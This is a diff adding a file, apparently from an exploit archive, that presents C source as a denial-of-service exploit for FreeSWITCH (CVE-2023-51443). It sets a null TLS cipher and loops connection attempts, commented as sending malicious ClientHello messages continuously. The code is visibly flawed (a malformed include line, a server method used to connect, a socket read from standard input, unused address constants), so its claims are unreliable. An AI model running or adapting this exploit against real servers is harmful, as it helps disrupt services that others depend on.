@@ -1,0 +1,84 @@
+id: 39226
+date: 01/08/2024
+title: FreeSWITCH Denial Of Service Exploit
+author: Amirhossein Bahramizadeh
+cves: CVE-2023-51443
+
+#include <stdio.h
+#include <string.h>
+#include <unistd.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
+#define IP "127.0.0.1"
+#define PORT 5061
+
+int main() {
+    SSL_library_init();
+    SSL_load_error_strings();
+    OpenSSL_add_ssl_algorithms();
+
+    const SSL_METHOD *method = TLS_server_method();
+    SSL_CTX *ctx = SSL_CTX_new(method);
+
+    if (!ctx) {
+        fprintf(stderr, "Unable to create SSL context\n");
+        ERR_print_errors_fp(stderr);
+        return 1;
+    }
+
+    SSL *ssl = SSL_new(ctx);
+    if (!ssl) {
+        fprintf(stderr, "Unable to create SSL\n");
+        ERR_print_errors_fp(stderr);
+        return 1;
+    }
+
+    if (SSL_set_fd(ssl, fileno(stdin)) <= 0) {
+        fprintf(stderr, "Unable to set SSL file descriptor\n");
+        ERR_print_errors_fp(stderr);
+        return 1;
+    }
+
+    if (SSL_set_connect_state(ssl) <= 0) {
+        fprintf(stderr, "Unable to set SSL connect state\n");
+        ERR_print_errors_fp(stderr);
+        return 1;
+    }
+
+    const SSL_CIPHER *cipher = SSL_CIPHER_find("TLS_NULL_WITH_NULL_NULL");
+    if (!cipher) {
+        fprintf(stderr, "Unable to find cipher\n");
+        ERR_print_errors_fp(stderr);
+        return 1;
+    }
+
+    SSL_set_cipher_list(ssl, "TLS_NULL_WITH_NULL_NULL");
+
+    if (SSL_connect(ssl) <= 0) {
+        fprintf(stderr, "Unable to connect\n");
+        ERR_print_errors_fp(stderr);
+        return 1;
+    }
+
+    printf("Connected with cipher %s\n", SSL_CIPHER_get_name(SSL_get_current_cipher(ssl)));
+
+    // Send malicious ClientHello messages continuously
+    while (1) {
+        if (SSL_connect(ssl) <= 0) {
+            fprintf(stderr, "Unable to connect\n");
+            ERR_print_errors_fp(stderr);
+            return 1;
+        }
+        sleep(1);
+    }
+
+    SSL_shutdown(ssl);
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
+    EVP_cleanup();
+
+    return 0;
+}
+
+#  0day.today [2024-01-15]  #
